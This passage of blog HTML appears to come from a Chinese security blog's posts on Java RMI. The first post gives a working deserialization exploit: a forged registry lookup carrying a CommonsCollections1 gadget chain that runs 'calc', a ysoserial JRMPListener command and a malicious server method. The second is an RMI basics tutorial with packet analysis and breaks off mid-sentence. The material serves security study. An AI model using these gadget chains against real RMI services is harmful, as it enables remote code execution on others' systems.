class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure><p>但在客户端这边我们只能传入字符串, 该怎么传入恶意类呢?</p><p>实际上我们可以通过反射直接修改lookup中用到的对象为恶意对象,并反射执行(简单说就是伪造一个lookup), 这样就可以绕过这一限制, 至于服务端的强制类型转换, 并不影响反序列化的执行</p><p>可以根据<code>RegistryImpl_Stub</code>这个类中的lookup方法来构造, 由于这个类是反编译过来的, 看起来还是比较麻烦, 先看最终的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看原本的lookup, 逐步分析我们自己的lookup是如何伪造的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214158257.png" alt="image-20240710214158257"></p><p>首先是90行的newCall的调用, 我们必须得先获取到这个ref属性</p><p>我们根据继承关系找到这个ref定义的位置, 也就是RegistryImpl_Stub的父类的父类RemoteObject</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214603105.png" alt="image-20240710214603105"></p><p>因此我们就可以这样来反射获取它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>在newCall方法中有一个operations参数, 也需要反射获取, 这个值就在RegistryImpl_Stub中, 是一个私有常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>接下来照着lookup中的形式编写代码即可, 但在写入数据时, 我们写入恶意对象remote</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br></pre></td></tr></table></figure><p>这里的ref.invoke就意味着进行网络传输了</p><p>对于unbind也是类似的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710215616245.png" alt="image-20240710215616245"></p><p>稍微修改一下即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">4</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ref.invoke(var2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>在进行bind unbind rebind list lookup这些操作时, 除了unbind rebind, 客户端都是会接收服务端返回的数据并进行反序列化的, 只要我们伪造一个注册中心, 返回恶意数据, 就能对客户端发起攻击</p><p>利用脚本太长, 直接用ysoserial现成的exp来验证了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240711143215299.png" alt="image-20240711143215299"></p><p>注意要用低版本的java, 我环境变量里是java18是运行不了的, 这里直接换到java1.8的目录里去执行</p><h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p> 这里也比较好理解, 客户端调用远程方法, 服务端返回结果, 这个结果可以是一个对象, 客户端接收这个对象, 这过程服务端序列化对象, 客户端反序列化对象, 使得客户端易受攻击</p><p> 重写服务器上的远程方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;CC1&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> CC1();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">iHello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) iHello.sayHello(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是服务器返回恶意对象</p><p>另一种是加载远程对象</p><p>当服务器返回了一个客户端位置的类的对象时, 客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p>这个利用条件相当苛刻</p><p>只有如下条件的服务器才能被攻击：</p><ol><li>设置了java.rmi.server.useCodebaseOnly&#x3D;false，或者java版本低于7u21、6u45（低于这几个版本默认为false）</li><li>设置<code>System.*setSecurityManager*(new RMISecurityManager());</code></li></ol><h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h3><p>客户端和服务端传输对象都是序列化反序列化进行的, 因此可以互相打</p><p>对于服务端, 它需要有一个受攻击的方法, 接收一个对象作为参数, 这样在客户端传入恶意对象后, 服务端将其反序列化从而受到攻击</p><p>比较简单不做演示</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI</title>
      <link href="/2024/06/06/Java-RMI/"/>
      <url>/2024/06/06/Java-RMI/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a></p><p><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/</a></p><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><h2 id="RMI的几个重要部分"><a href="#RMI的几个重要部分" class="headerlink" title="RMI的几个重要部分"></a>RMI的几个重要部分</h2><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功）</li></ul><h3 id="远程对象调用"><a href="#远程对象调用" class="headerlink" title="远程对象调用"></a>远程对象调用</h3><blockquote><p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-80.png" alt="图片-80"></p><h2 id="测试RMI"><a href="#测试RMI" class="headerlink" title="测试RMI"></a>测试RMI</h2><p>我创建了两个项目, 用于测试服务端和客户端</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>IHello.java 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServer.java</p><ul><li><p>实现 <code>IHello</code> 远程接口, 实现<code>Registry</code></p></li><li><p>继承 <code>UnicastRemoteObject</code> 类，用于生成 Stub（存根）和 Skeleton（骨架）。</p></li><li><p>实现类中使用的对象必须都可序列化，即都继承<code>java.io.Serializable</code></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里bind有两种写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>区别是一个需要加<code>rmi://0.0.0.0:1099/</code>一个不需要</p><p>我后面图片中可能有的地方书写有误, 不过bind的地方流程比较简单, 不影响分析</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。</p><p>当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><p>IHello.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(ihello.sayHello(<span class="string">&quot;hello, n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client成功调用了Server的对象和方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606144439733.png" alt="image-20240606144439733"></p><h2 id="JRMP协议分析"><a href="#JRMP协议分析" class="headerlink" title="JRMP协议分析"></a>JRMP协议分析</h2><p>我们将CLi端打包放进虚拟机中运行, 抓包分析rmi过程产生的流量,注意改一下ip</p><p>为cli项目添加入口类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新版本或适合您项目的版本 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 指定主类的全路径名称 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>org.rmi.RMIClient<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用maven打包即可</p><p>wireShark抓包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606155805887.png" alt="image-20240606155805887"></p><p>首先我们可以看见进行了TCP的三次握手, 建立了一条TCP链</p><p>其中192.168.1.11服务端, 192.168.244.128为客户端</p><p>这里我们也可以看见实际上是连接的1099端口(也就是Registry), 